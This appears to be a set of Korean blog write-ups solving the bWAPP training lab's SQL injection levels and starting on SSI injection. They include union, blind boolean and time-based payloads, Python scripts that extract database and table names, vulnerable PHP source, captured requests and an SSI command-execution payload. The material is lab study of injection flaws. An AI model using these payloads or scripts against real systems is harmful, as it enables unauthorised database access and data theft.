&quot;&lt;td width='80'&gt;&lt;b&gt;IMDb&lt;/b&gt;&lt;/td&gt;&quot; + &quot;&lt;/tr&gt;&quot; );} 위와 같이 자바스크립트의 JQUERY를 이용하여 입력한 데이터를 받았다.그 후 AJAX로 데이터를 sqli_10-2.php로 넘겼다.한번 sqli_10-2.php에 Injection 코드를 넘겨보겠다. sqli_10-2.php에게 받은 데이터는 JSON 형식으로 영화 데이터였다. 이와 같이 꼭 HTML의 Form만 아니라 다양한 입력 방식을 통해서 Injection 가능하다는 것을 배울 수 있었다. Source Codefunctions_external.php 123function no_check($data){ return $data; } sqli_10_2.php 1234567891011if(!empty($_GET[&quot;title&quot;])){ // Retrieves the movie title $title = $_GET[&quot;title&quot;]; // Constructs the query $sql = &quot;SELECT * FROM movies WHERE title LIKE '%&quot; . sqli($title) . &quot;%'&quot;; // Queries the database $recordset = mysql_query($sql, $link);} 위와 같이 입력 데이터에 아무 검증 없이 sql문에 넣는 것을 확인 할 수 있었다. Medium &amp; High2문제는 추후에 우회 방법을 찾는대로 업로드하겠다.","link":"/2020/12/20/SQL-Injection-AJAX-JSON-JQUERY/"},{"title":"SQL Injection - Blind (Boolean-Based)","text":"Boolean Based SQLi이란?SQL Injection의 결과가 참과 거짓으로만 나오는 페이지에서 참, 거짓만으로 DB의 정보를 가지고오는 SQL Injection 공격 Low Error로 정보를 얻어보려고 했지만, DB의 에러 메시지는 출력되지 않았다. 검색을 위한 SQL문이 SELECT ~~~ FROM ~~~ WHERE ~~~='입력값';이라는 형태라는 것을 생각하여 ' or '1'='1를 시도했다.모든 정보를 가져오려고 했지만, 데이터 출력은 실패하였고, 입력된 데이터와 같은 영화는 DB에 존재한다는 참 출력값을 얻을 수 있었다. 이번엔 다른 출력값을 보기 위해서 ' or '1'='2를 넣고 결과를 출력하였다.존재하지 않는다는 거짓 출력값을 얻을 수 있었다. 이 3개의 출력값을 이용하여 DB의 데이터를 추측할 수 있다. 컬럼의 갯수 파악' order by ~;# or union select ~;#를 이용하여 컬럼의 갯수를 파악하겠다. - `' order by ~;#` 에러 메시지가 나올 때까지 점차 숫자를 올려갔다. 컬럼의 갯수가 7개라는 것을 알아낼 수 있었다. - ' union select ~;# 이것 역시 검색 쿼리에서 지정한 컬럼의 갯수를 알아낼 수 있는 방법 중 하나이다. 컬럼의 갯수 : 7개 DB의 이름 길이 파악length 함수를 이용하여 이름의 길이를 알아낼 것이다.' or '1'='1' and length(database())=~;#or는 둘 중 하나만 true면 true가 된다. 하지만 and는 둘 다 true이어야 true가 된다. ' or '1'='1' and length(database())=1;# ' or '1'='1' and length(database())=5;# 위 SQLi를 실행한 결과 DB의 이름 길이는 5자리인 것으로 파악인 된다. DB의 이름 파악substring 함수를 이용하여 DB의 이름을 알아낼 것이다.substring 함수는 지정된 부분에서 몇 번째 문자를 출력하는 함수이다. ex). DB 이름 -&gt; 원투 -&gt; substring(database(),2,1) -&gt; 투 이러한 방법은 파이썬을 이용하여 알아내겠다. Python Code1234567891011121314151617181920212223242526272829303132333435import requestsfrom bs4 import BeautifulSoupfrom string import ascii_lowercasealpha_list = list(ascii_lowercase) #소문자 알파벳 a~z를 리스트로 저장url = input() #시도할 url 입력db_name = 'DB의 이름 : ' #DB 이름의 알파벳을 저장할 str 변수index = 1 #몇번째 자리를 검사할지 결정하는 변수while True: for _ in alpha_list: #SQLi 쿼리 sqli = f&quot;{url}?title=%27+or+%271%27%3D%271%27+and+substring%28database%28%29%2C{index}%2C1%29%3D%27{_}%27%23&amp;action=search&quot; #세션값을 같이 보내주어 세션 인증 #PHPSESSID은 확인하여 자신의 세션값을 넣으면 된다. headers = {'security_level' : '0', 'PHPSESSID' : '898fa528555e536555feb61910c792c8'} response = requests.get(sqli, cookies=headers) html = response.text soup = BeautifulSoup(html, 'html.parser') result = soup.select_one('div#main') #결과가 맞는지 확인하는 조건문 if result.contents[-1].replace('\\n', '') == ' The movie exists in our database!': db_name += _ #SQLi 쿼리에 True가 나온 알파벳 저장 break index += 1 if index &gt; 5: break print(db_name) 파이썬 코드로 간단하게 만들었다.처음 파이썬을 접하거나 크롤링을 안해봤던 사람들은 인터넷에 검색하면서 하는데 시간이 좀 걸리겠지만, 금방 할 수 있을 것이다. ' or 1=1 and database()='bwapp'#결과값으로 bwapp을 얻을 수 있었다. 테이블 이름의 길이 파악일단 이름을 파악하기 위해선 이름의 길이를 파악을 해야한다. limit를 이용하여 출력되는 레코드의 개수를 제한한다.' or 1=1 and length((select table_name from information_schema.tables where table_schema='bwapp' limit 0,1))=~#~를 1부터 시작하여 길이에 맞는 값이 나오면 참이 출력될 것이다. 입력 : ' or 1=1 and length((select table_name from information_schema.tables where table_schema='bwapp' limit 0,1))=1#값이 False가 나왔으니 결과값이 DB에 존재하지 않는다고 출력된다. 입력 : ' or 1=1 and length((select table_name from information_schema.tables where table_schema='bwapp' limit 0,1))=4#True가 나왔으니, 테이블 이름의 길이는 4로 판단이 된다. 테이블 이름 파악' or 1=1 and substring((select table_name from information_schema.tables where table_schema='bwapp' limit 0,1),1,1)='~'#이번 역시 substring 함수를 이용하여 이름의 한글자 하나하나 검사하였다. Python Code123456789101112131415161718192021222324252627282930313233import requestsfrom bs4 import BeautifulSoupfrom string import ascii_lowercasealpha_list = list(ascii_lowercase)url = input()db_name = '테이블의 이름 : 'index = 1while True: for _ in alpha_list: sqli = f&quot;{url}?title=%27+or+1=1+and+substring((select+table_name+from+information_schema.tables+where+table_schema=%27bwapp%27+limit+0,1),{index},1)=%27{_}%27%23&amp;action=search&quot; #세션값을 같이 보내주어 세션 인증 #PHPSESSID은 확인하여 자신의 세션값을 넣으면 된다. headers = {'security_level' : '0', 'PHPSESSID' : '321bc53ee5ae297a46333feceff717dd'} response = requests.get(sqli, cookies=headers) html = response.text soup = BeautifulSoup(html, 'html.parser') result = soup.select_one('div#main') if result.contents[-1].replace('\\n', '') == ' The movie exists in our database!': db_name += _ break index += 1 if index &gt; 4: break print(db_name) ' or 1=1 and (select table_name from information_schema.tables where table_schema='bwapp' limit 0,1)='blog'#결과로 blog가 나왔다.","link":"/2021/01/21/SQL-Injection-Blind-Boolean-Based/"},{"title":"SQL Injection - Blind (Time-Based)","text":"Low결과는 이메일로 전송된다는 말을 보니 페이지에선 어떠한 결과을 받을 수 없을 것 같다. sleep 함수를 사용하면 출력하는 것이 지연된다. 이것을 이용하여 지연이 되면 참, 안되면 거짓으로 판단 할 수 있다. 입력 : ' or 1=1 and sleep(1)#1초 지연 후 출력되는 것을 볼 수 있다. SQLi - Blind (Boolean-based)과 같은 방식에 위와 같은 조건을 추가하면, 지연이 되는 것을 보고 참과 거짓을 판단할 수 있을 것이다.Ex). ' or 1=1 and length(database())=~ and sleep(5)#","link":"/2021/01/21/SQL-Injection-Blind-Time-Based/"},{"title":"SQL Injection(Captcha)","text":"Low페이지를 들어갔더니, Captcha를 입력하라는 form이 있어서 입력해보았다. 영화 데이터를 조회할 수 있는 페이지가 나왔고, 오류가 생기면 출력을 하는지 확인하기 위해서 '를 입력하였다. 오류 메시지가 출력되는 것을 확인할 수 있었다. 추가적으로 ' or '1'='1를 입력하여 Injection이 되는 지 확인했는데 잘 되었다.전의 문제와 유사하여, 더 진행하지 않겠다. 또한 소스코드도 같아서 전에 풀이한 문제 링크를 참조하겠다.Link : https://lrtk-coder.github.io/2020/12/18/SQL-Injection-Get-Search/","link":"/2020/12/24/SQL-Injection-Captcha/"},{"title":"SQL Injection(Get&amp;Post&#x2F;Select)","text":"Low이전 문제인 Search 페이지와 유사한 페이지가 나왔다.차이점은 사용자 직접 입력을 하지 않고, HTML 태그의 Option 태그를 이용하여 선택하는 방식으로 변경이 되었다. 나는 개발자 도구와 URL 창에서 서버에 보내주는 movie 변수의 값을 변경하여 SQL Injection하였다. 123456789101112&lt;select name=&quot;movie&quot;&gt; &lt;option value=&quot;1&quot;&gt;G.I. Joe: Retaliation&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;Iron Man&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;Man of Steel&lt;/option&gt; &lt;option value=&quot;4&quot;&gt;Terminator Salvation&lt;/option&gt; &lt;option value=&quot;5&quot;&gt;The Amazing Spider-Man&lt;/option&gt; &lt;option value=&quot;6&quot;&gt;The Cabin in the Woods&lt;/option&gt; &lt;option value=&quot;7&quot;&gt;The Dark Knight Rises&lt;/option&gt; &lt;option value=&quot;8&quot;&gt;The Fast and the Furious&lt;/option&gt; &lt;option value=&quot;9&quot;&gt;The Incredible Hulk&lt;/option&gt; &lt;option value=&quot;10&quot;&gt;World War Z&lt;/option&gt;&lt;/select&gt; 개발자 도구를 이용하여 option 태크의 value 속성을 변경하였다.&lt;option value=&quot;'&quot;&gt;G.I. Joe: Retaliation&lt;/option&gt; 그 후, 서버로 보내서 확인하니 Error 메시지가 출력되는 것을 확인할 수 있었다. 2번째 방법인 URL 창을 이용하는 방법은 영화를 선택한 후 서버로 보내고 난 후의 URL의 파라미터를 이용하여 Injection을 하였다.정상 : /bWAPP/sqli_2.php?movie=1&amp;action=goInjection : /bWAPP/sqli_2.php?movie=1 or 1=1&amp;action=go 여기서 의문이 생길 것이다. 왜 '를 입력하지 않는지그 이유는 이 페이지에선 Id값 즉, 정수를 입력받아 처리하기 때문에 ‘’이 필요가 없다.그래서 Injecion할 때 '를 쓰지 않았다. 위의 Injection이 오류 없이 실행이 된 모습이다.하지만 출력된 데이터는 단 하나 뿐이다. 추측 상으로 단 하나의 데이터만 출력되겠끔 설계되어 있는 것 같다. 만약 여기에 Union 기반 Injection을 시도한다면, 맨 아래에 출력되기 때문에 앞에 출력된 데이터가 출력이 안되게 해야한다.방법은 간단하다. 1=1이라는 참을 거짓으로 만드면 된다. 물론 조건인 or를 and로 변경하여 해당 값 자체를 거짓으로 만들어야한다. 입력 : /bWAPP/sqli_2.php?movie=1 and 1=0 union select 1,2,3,4,5,6,7 그 이후에는 SQL Injection Search 문제를 참고하면 된다. Source Codefunctions_external.php 123function no_check($data){ return $data;} sqli_2.php 1234567891011121314151617if(isset($_GET[&quot;movie&quot;])){ $id = $_GET[&quot;movie&quot;]; $sql = &quot;SELECT * FROM movies&quot;; // If the user selects a movie if($id) { $sql.= &quot; WHERE id = &quot; . sqli($id); } $recordset = mysql_query($sql, $link);} $sql.= &quot; WHERE id = &quot; . sqli($id);를 보면 우리가 입력 받은 값을 아무 검증 없이 sql문에 넣는 모습를 볼 수 있다. Medium123function sqli_check_2($data){ return mysql_real_escape_string($data); } mysql_real_escape_string 함수의 우회 방법은 찾는대로 업로드하겠습니다. High이 문제는 High 문제가 없다.","link":"/2020/12/20/SQL-Injection-Get-Post-Select/"},{"title":"SQL Injection(Get&amp;Post&#x2F;Search)","text":"Low페이지를 보니 영화를 검색하는 페이지인 것 같다.어떤 영화가 있는지 잘 모르겠어서 Form에 a만 입력하여 검색을 해보았다. 영화 제목에 a가 들어간 영화가 출력이 되었다.SQL에 에러를 일으켜서 어떤 에러가 일어나는지 확인을 하였다. 입력값 : '현재 사용 중인 DB는 Mysql인 것으로 확인할 수 있었다.이와 같이 에러를 발생시켜서 에러 메시지로부터 DB 정보를 얻어내는 기법을 Error Based Injection이라고 한다. 또한 추측상으로 select ~~~ from ~~~ where '입력값';으로 이루어진 sql문이라고 추측을 해본다. 그래서 입력을 '을 했을 때 오류가 뜬 이유가 select ~~~ from ~~~ where ''';으로 되어서 오류가 출력된 것으로 생각을 한다. Error Based Injection으로도 볼 수 있는 '1'='1'을 이용하여 모든 데이터를 출력하겠다. 입력값 : ' or '1'='1잘 먹히는 것을 볼 수 있다.다른 SQL Injection 공격 방법인 Union Based SQL Injecion를 시도하여 영화의 데이터가 저장된 테이블에 몇 개의 컬럼이 있는지 확인하겠다. 입력값 : ' union select 1,2,3,4,5,6,7#페에지에 나온 컬럼(Title, Release, Character, Genre, IMDb) 5개 이상으로 생각하여 15부터 시작하였고, 17 때에 성공하였다.테이블 제일 밑에 Union에 의해 합쳐서 출력된 1~7을 보니 1은 나타나지 않고 2부터 나타났다. 또한 7도 나타나지 않았다.아마 1번째 컬럼은 ID 컬럼으로 추측이 되고, 7번째 컬럼은 확인을 해봐야하겠다. 입력값 : ' union select 1,table_name,3,4,5,6,7 from information_schema.tables#DB의 메타데이터를 통해 DB에 저장된 테이블명을 출력하였다.관련이 있어보이는 movies이라는 테이블을 찾을 수 있었다. 이 테이블의 컬럼명을 얻어보겠다. 입력값 : ' union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='movies'#확인해보니 7번째 컬럼은 tickets_stock이라는 이름을 가진 컬럼으로 알 수 있었다. Source Codefunctions_external.php 123function no_check($data){ return $data;} sqli_1.php 12345678910111213if(isset($_GET[&quot;title&quot;])){ $title = $_GET[&quot;title&quot;]; $sql = &quot;SELECT * FROM movies WHERE title LIKE '%&quot; . sqli($title) . &quot;%'&quot;; $recordset = mysql_query($sql, $link); if(!$recordset){ // die(&quot;Error: &quot; . mysql_error()); &lt;tr height=&quot;50&quot;&gt; &lt;td colspan=&quot;5&quot; width=&quot;580&quot;&gt;&lt;?php die(&quot;Error: &quot; . mysql_error()); ?&gt;&lt;/td&gt; &lt;/tr&gt;} 입력 데이터에 대한 검증이 없다. 또한 Mysql에 Error가 발생하면 그대로 출력하는 코드도 있다. MediumSource CodeMedium 123function sqli_check_1($data){ return addslashes($data);} High 123function sqli_check_2($data){ return mysql_real_escape_string($data);} addslashes 함수는 iFrame Injection에서 설명을 보면 된다. mysql_real_escape_string 함수는 PHP에서 SQL Injection 공격 등을 방어하기 위하여 특수 문자를 치환하기 위한 함수이다. [치환되는 문자] \\x00 \\n \\r \\ ‘, “ \\x1a 위 문자들은 문자 앞에 \\를 붙여서 해당 문자가 작동하지 않도록 치환해준다. 이 두가지 함수를 우회하는 방법이 인터넷에서 몇가지가 있는데 시도를 해보니, 모두 실패하였다.이 부분은 추후에 보강하겠다.","link":"/2020/12/17/SQL-Injection-Get-Search/"},{"title":"SQL Injection(Login Form&#x2F;Hero)","text":"Low로그인 페이지가 나왔다.추측상으로 select ~~~ from ~~~ where id = '입력값' and pw = '입력값'으로 추측이 되기 때문에 '를 입력하여 오류 메시지가 출력되는지 확인하였다. ID 입력 : 'PW 입력 : '오류 메시지는 출력되지 않았다.일단 추측으로 생각한 sql문에 SQL Injection을 넣어보겠다. ID 입력 : ' or '1' = '1'#PW 입력 : aaSQL Injection이 성공하였고, Neo라는 사람으로 로그인되었다.DB에서 가장 첫번째로 있는 사람이 Neo인 듯 하다.이제 Union Based Injection을 시도하여, 데이터베이스의 컬럼 갯수를 알아보겠다. ID 입력 : ' union select 1,2,3,4#PW 입력 : aa첫 시도에 성공하였다.1번은 Number, 2번은 ID, 3번은 PW로 생각하고 4번째부터 시도했는데 컬럼의 갯수가 4개였다.아마 4번째는 secret이 저장된 컬럼인 듯 하다. ID 입력 : ' union select 1,table_name,3,4 from information_schema.tables where table_schema = database() limit 1,1#PW 입력 : aaDB 메타데이터를 이용하여 테이블을 찾아보았다.현재의 페이지에는 하나의 테이블명만 가져올 수 있다. 그래서 limit을 사용하여 테이블명을 파싱하였다. SQL - Limitlimit x, yx -&gt; 시작점y -&gt; 출력할 갯수 x번째부터 시작해서 y개만 출력여기서 주의할 점은 맨 앞 index는 0번부터 시작한다는 점이다. 두번째 테이블명이 Heroes였다. 문제의 제목이 hero가 들어가는 것을 생각하니 연관이 있을거라 생각하여 컬럼명을 조회했다. ID 입력 : ' union select 1,column_name,3,4 from information_schema.columns where table_name='heroes' limit 0,1#PW 입력 : aa컬럼명을 보니 heores 테이블에 데이터가 저장이 되는 것 같다.이제 ID 컬럼과 Login 컬럼을 확인하여 ID값을 찾아보겠다. ID 입력 : ' union select 1,id,3,4 from heroes limit 0,1#PW 입력 : aaID 컬럼은 데이터의 index을 저장하는 컬럼인 것으로 보인다. ID 입력 : ' union select 1,login,3,4 from heroes limit 0,1#PW 입력 : aaLogin 컬럼이 ID 값을 저장한 컬럼인 것을 확실하게 검증하였다.이제 반복하여, ID 값을 뽑아보겠다. [출력된 ID값]Neo, Alice, Thor, Wolverine, Johnny, Seline 출력된 ID 값을 보니, 누가 Superhero인지를 모르겠다.이제 Secret 컬럼을 출력하여, Superhero을 찾아보겠다. ID 입력 : ' union select 1,secret,3,4 from heroes limit 4,1#PW 입력 : aa확인하니 5번째 ID값이 Superhero였다. 즉, Johnny가 슈퍼히어로 고스트라이더였던 것이다. Medium &amp; High추후에 업데이트하겠습니다.","link":"/2020/12/24/SQL-Injection-Login-Form-Hero/"},{"title":"SQL Injection(SQLite)","text":"Low페이지를 보니, Mysql을 사용했던 SQL Injection 문제와 같은 페이지가 나왔다.하지만 이번 문제는 Mysql이 아닌 SQLite을 사용하여 구현한 페이지으로 판단된다.Error을 일으켜 어떤 오류 메시지를 출력하는지 확인하겠다. Error 코드가 출력되었다.검색하니 General error: 1 unable to open database이라는 뜻을 가진 에러 코드였다. 해석하자면, DB에 접속을 할 수 없다는 Error이다. 입력 : ' or '1'='1SQLite도 SQL Injection이 성공하였다. Mysql의 SQL Injection 문제처럼 테이블명, 컬럼명, 컬럼 갯수를 알아보겠다.그리고, Mysql와 어떤 차이점이 있는지 알아보겠다. 입력 : ' union select 1,2,3,4,5,6--Union을 이용하여 컬럼의 수를 알아냈다. 여기서 알 수 있는 점은 SQLite에선 주석 처리를 --로 한다는 것이다. 입력 : ' union select 1,name,3,4,5,6 from sqlite_master where type='table'-- 또는 ' union select 1,tbl_name,3,4,5,6 from sqlite_masterSQLite는 메타데이터가 저장된 곳이 sqlite_master에 저장이 된다. Mysql의 information_schema와 같다고 생각하면 된다.where은 안써도 테이블명이 출력되긴 하지만, 다른 데이터도 출력됨으로 type이 table인 것만 출력하였다. 입력 : ' union select 1,sql,3,4,5,6 from sqlite_master where tbl_name='movies'--SQLite는 별도의 컬럼 필드가 없기 때문에 생성할 때 만든 sql 쿼리를 담고 있는 sql필드를 이용하였다. Source Codefunctions_external.php 123function no_check($data){ return $data; } sql_11.php 1$sql = &quot;SELECT * FROM movies WHERE title LIKE '%&quot; . sqli($title) . &quot;%'&quot;; 검증을 거치지 않고 그대로 sql 쿼리에 입력데이터를 넣어주었다. Medium추후에 업데이트하겠다. Source Code12345678function sqli_check_4($data){ // Not bulletproof // Replaces a single quote (') $input = str_replace(&quot;'&quot;, &quot;''&quot;, $data); return $input;} High이 문제에선 High Level은 없다.","link":"/2020/12/24/SQL-Injection-SQLite/"},{"title":"SQL Injection - Stored (Blog)","text":"Low페이지에 들어가니 전에 풀었던 HTML Injection - Stored (Blog) 문제의 잔재들이 보인다. DB 테이블이 같은 것로 활용하여 문제를 만든 것 같다. ::입력 : ‘aaaaaaa::Error를 일으켜서 Mysql를 사용하였다는 정보를 얻을 수 있었다.또한 URL를 확인하니 파라미터가 없는 것을 알 수 있었다. -&gt; POST를 사용한다는 뜻 12345678910111213141516POST /bWAPP/sqli_7.php HTTP/1.1Host: 192.168.219.164Content-Length: 18Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://192.168.219.164Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.219.164/bWAPP/sqli_7.phpAccept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=03d4a89519816567dd8ed545ffa299c5; security_level=0Connection: closeentry=aaa&amp;blog=add Burp Suit를 이용하여 데이터가 어떻게 전송하는지 확인하였다.입력한 데이터는 entry이라는 파라미터, blog 파라미터는 button의 결과값이다. 이제 SQLi이 되는지 확인하였다.오류를 보니 아마 ::INSERT INTO Blog (컬럼1, 컬럼2) VALUES (‘입력값’, ‘bee’)::으로 추측된다. 계정명인 ::’bee’::에 Query를 넣어서 SQLi를 시도하겠다.::입력 : test', (select @@version))#:: -&gt; ::INSERT INTO Blog (컬럼1, 컬럼2) VALUES ('test',(select @@version))#, 'bee')::SQLi가 성공하였다. Union를 사용하여 테이블명, 컬럼명도 알아낼 수 있다.이부분은 전에 풀이하였던 SQLi 문제에서 했던 방식대로 응용하여 시도하면 된다. Source Code12345678910111213141516171819202122if(isset($_POST[&quot;blog&quot;])){ $entry = sqli($_POST[&quot;entry&quot;]); $owner = $_SESSION[&quot;login&quot;]; if($entry == &quot;&quot;){ $message = &quot;&lt;font color=\\&quot;red\\&quot;&gt;Please enter some text...&lt;/font&gt;&quot;; } else{ $sql = &quot;INSERT INTO blog (date, entry, owner) VALUES (now(),'&quot; . $entry . &quot;','&quot; . $owner . &quot;')&quot;; $recordset = $link-&gt;query($sql); if(!$recordset){ die(&quot;Error: &quot; . $link-&gt;error . &quot;&lt;br /&gt;&lt;br /&gt;&quot;); } // Debugging // echo $sql; $message = &quot;&lt;font color=\\&quot;green\\&quot;&gt;The entry was added to our blog!&lt;/font&gt;&quot;; }} Medium &amp; High추후에 업로드하겠습니다. MediumError를 일으키려고 했지만, 특정 문자를 치환하는 SQLi 검증이 있다. Source CodeHighSource CodeSQL Injection 종류 Error Based SQLi -&gt; 오류를 일으켜 DB 정보 획득 Union Based SQLi -&gt; Union를 이용하여 다른 테이블을 결합하여 데이터 획득 Blind SQLi -&gt; 에러나 정보를 얻을 수 없을 때 서버의 반응을 통해 데이터 획득 Stored Procedure SQLi -&gt; 프로시져를 이용하여 Shell을 실행하거나 Query 결과 획득 Boolead Based SQLi Time Based SQLi","link":"/2021/01/21/SQL-Injection-Stored-Blog/"},{"title":"SQL Injection - Stored (SQLite)","text":"LowPHP의 SQLite 모듈을 사용하였다고 써져있다. 어떤 기능을 가진 페이지인지 확인하겠다.입력 : testButton : Add Entry Button : Delete Entries확인을 해보니, Add 버튼은 Form에 입력한 데이터를 DB를 저장하는 기능이고, Delecte 버튼은 DB에 저장된 데이터를 삭제하는 기능이다. Error를 일으켜 정보를 획득하겠다.입력 : ‘오류 메시지는 출력이 안된다.또한 ' or '1' = '1의 경우는 어차피 페이지 기능이 DB에 저장된 데이터를 출력하는 거라서 여기선 필요없다. 아무런 정보가 없어서 추측을 해보겠다.보통 이런 기능은 INSERT 문을 이용하여 DB에 데이터를 추가한다.아마 INSERT INTO table_name (column1, column2, ... column_N) VALUES (data, data,'입력값', data);으로 되어있을거라 추측이 된다. 저 INSERT 문으로 생각하고 SQL Injection를 시도하겠다.INSERT 문에 대한 어떠한 정보도 얻을 수 없어서 test');#부터 시작하여 추가가 안되면, test' 뒤에 , ''를 추가하여 SQLi를 진행하였다.입력 : test’, ‘’);# Form의 입력값이 뒤에서 두번째이며, Owner가 맨 뒤 자리인 것으로 확인되었다.Owner의 자리를 이용하여 SQLi를 더 진행하겠다. 입력 : test’, sqlite_version());# 입력 : test’, (SELECT name FROM sqlite_master WHERE type=’table’ ));# 그 후의 SQLi은 전에 풀이했던 SQLite 문제에서 설명했으니 진행은 안하겠다. Source CodeFunction_external.php 123function no_check($data){ return $data; } sqli_12.php 1$sql = &quot;INSERT INTO blog (id, date, entry, owner) VALUES (&quot; . ++$id . &quot;,'&quot; . date('Y-m-d', time()) . &quot;','&quot; . $entry . &quot;','&quot; . $owner . &quot;');&quot;; 예상한 INSERT 문이 맞았다.Low 문제에선 아무런 검증 없이 바로 데이터를 return하였다. Medium문제 풀이는 추후에 업데이트하겠다. Source CodeFunction_external.php 12345678function sqli_check_4($data){ // Not bulletproof // Replaces a single quote (') $input = str_replace(&quot;'&quot;, &quot;''&quot;, $data); return $input; } High이 문제에선 High가 없다. Medium과 같다.","link":"/2021/01/21/SQL-Injection-Stored-SQLite/"},{"title":"SQL Injection - Stored (User-Agent)","text":"Low들어가보니 아이피랑 User-Agent가 DB에 저장이 된 것 같다. HTML의 a태그인 download를 클릭하니, visitors.txt로 로그가 저장이 되었다. Burp Suite를 이용해서 User-Agent를 '로 수정해서 Error가 일어나는지 확인하겠다.Error가 발생하였고, Mysql로 이루어진 것을 확인하였다. '으로 만으로 INSERT 문이 어떻게 되었는지 확신이 힘들어서 'test'를 넣어서 다시 확인하였다.확인해보니, 이제 INSERT 문을 확신 할 수 있었다.INSERT INTO table_name VALUES (data, ..., User-Agent, IP address);로 된 것으로 추측이 된다. SQLi를 위해 User-Agent : ', version());#로 수정하여 넘겨주었다.SQLi가 성공하였다. 그 이후는 다른 SQLi 문제에서 설명했으니 참고하면 된다. Source Code","link":"/2021/01/21/SQL-Injection-Stored-User-Agent/"},{"title":"SQL Injection - Stored (XML)","text":"Low“Any bugs?” 박스를 클릭하여 반응을 살펴봤지만, 아무 반응이 없었다.개발자 도구를 사용하여 소스코드를 확인해보았다. &lt;input type=&quot;button&quot; onclick=&quot;ResetSecret();&quot; value=&quot;Any bugs?&quot;&gt; 버튼은 클릭 시 ResetSecret 함수를 실행한다. 12345678910111213141516function ResetSecret(){ var xmlHttp; // Code for IE7+, Firefox, Chrome, Opera, Safari if(window.XMLHttpRequest) { xmlHttp = new XMLHttpRequest(); } // Code for IE6, IE5 else { xmlHttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); } xmlHttp.open(&quot;POST&quot;,&quot;sqli_8-2.php&quot;,true); xmlHttp.setRequestHeader(&quot;Content-type&quot;,&quot;text/xml; charset=UTF-8&quot;); xmlHttp.send(&quot;&lt;reset&gt;&lt;login&gt;bee&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;&quot;);} ResetSecret 함수의 코드를 확인해보니, XHR(XMLHttpRequest) 함수를 사용하여 sqli_8-2.php에 XML 형식의 데이터를 보내고 있었다. Burp Suit을 사용하여 Error를 일으키겠다. Request 123456789101112POST /bWAPP/sqli_8-2.php HTTP/1.1Host: 192.168.219.164Content-Length: 59Content-type: text/xml; charset=UTF-8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Accept: */*Accept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=ca0465714ab59aed85000f85f95a02fa; security_level=0Connection: close&lt;reset&gt;&lt;login&gt;'&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt; 정상 시 나오는 반응 Error 시 나오는 반응여기서는 SQLi를 성공하여 페이지에 데이터를 출력이 안되서, Error Base SQLi로 데이터를 얻어와야한다. SQLi를 시도하기 전, SQL Query를 추측하겠다.있던 데이터의 값을 변경하는 것이니, UPDATE 문을 사용했을 것이다.UPDATE table_name SET secret='Any bugs?' WHERE login like bee으로 추측이 된다. 실패 시 123456789101112POST /bWAPP/sqli_8-2.php HTTP/1.1Host: 192.168.219.164Content-Length: 59Content-type: text/xml; charset=UTF-8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Accept: */*Accept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=ca0465714ab59aed85000f85f95a02fa; security_level=0Connection: close&lt;reset&gt;&lt;login&gt;bee'+(select 0 from test)+'&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt; 성공 시 123456789101112POST /bWAPP/sqli_8-2.php HTTP/1.1Host: 192.168.219.164Content-Length: 59Content-type: text/xml; charset=UTF-8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Accept: */*Accept-Encoding: gzip, deflateAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=ca0465714ab59aed85000f85f95a02fa; security_level=0Connection: close&lt;reset&gt;&lt;login&gt;bee'+(select 0 from users)+'&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt; Python을 이용하여 무차별 공격을 시도한다면, 테이블을 찾을 수 있다.또한 login의 값을 무차별 공격을 한다면, login의 데이터 값도 얻을 수 있을 것이다. Source Code","link":"/2021/01/21/SQL-Injection-Stored-XML/"},{"title":"SSI Injection","text":"Server Side Includes이란?HTML 페이지에 사용하는 지시어로, 페이지를 서비스할 때 서버가 처리한다.SSI를 사용하면 CGI 프로그램이나 다른 동적인 기술로 페이지 전체를 만들어서 서비스하지 않고도 HTML 페이지에 동적으로 생성한 내용을 추가할 수 있다. 즉, SSI을 이용하여 악성행위를 Injection할 경우 SSI은 그 지시를 받고 동적으로 페이지를 생성할 것이다. HTML로만 작성된 웹문서와는 달리 SSI코드가 들어있는 파일의 이름은 .shtml이라는 확장자를 가진다. * CGI : Web 서버에서 외부 프로그램과 통신하는 방법을 정의하는 스크립트 또는 프로그램 Low페이지를 보니 BeeBox 웹서버의 IP 주소를 조회하는 기능을 가진 페이지인 것 같다.First Name과 Last Name에 test, test를 입력하여 어떻게 결과가 나오는 확인하였다. Form에 입력했던 값이 그대로 나오고, 밑에 BeeBox 웹서버의 IP 주소이 출력되었다.또한 출력된 페이지는 확장자가 ssii.shtml의 이름을 가진 SSI 파일으로 확인되었다. Form에 SSI 지시어와 HTML 태그를 입력해보았다. First Name : &lt;h1&gt;test&lt;/h1&gt;Last Name : test HTML 태그가 그대로 적용이 된 것을 확인할 수 있었다.이번엔 SSI 지시어를 사용하여 Injection 하겠다. First Name : &lt;!--#exec cmd=&quot;ls&quot; --&gt;Last Name : test Source 